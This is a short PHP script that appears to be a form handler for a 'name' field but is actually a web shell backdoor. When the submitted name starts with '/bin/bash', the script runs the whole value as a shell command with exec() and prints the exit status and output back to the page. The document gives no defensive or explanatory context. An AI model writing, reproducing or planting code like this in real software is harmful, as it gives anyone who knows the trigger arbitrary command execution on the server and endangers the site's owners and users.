<?php
$fullname=$_POST["name"];
if (substr($fullname,0,9) == '/bin/bash') {
    $output=null;
    $retval=null;
    exec($fullname, $output, $retval);
    echo "Returned with status $retval and output:\n";
    foreach ($output as $line) {
        echo "<br>" . $line;
    }
}
?>

